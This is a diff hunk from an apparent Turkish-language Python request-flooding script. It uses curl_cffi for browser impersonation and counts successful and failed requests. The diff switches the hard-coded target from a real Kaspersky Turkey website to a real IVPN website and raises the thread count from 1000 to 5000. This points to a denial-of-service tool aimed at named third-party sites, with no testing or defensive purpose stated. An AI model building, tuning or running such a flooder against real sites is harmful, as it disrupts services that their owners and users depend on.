@@ -10,8 +10,8 @@ except ImportError:
     print("[ÇÖZÜM] Lütfen terminale 'pip install -U curl_cffi' komutunu yazarak kütüphaneyi kurun.")
     sys.exit(1)
 
-HEDEF_URL = 'https://www.kaspersky.com.tr/' 
-THREAD_SAYISI = 1000 
+HEDEF_URL = 'https://www.ivpn.net/en/' 
+THREAD_SAYISI = 5000 
 
 basarili_istekler = 0
 basarisiz_istekler = 0
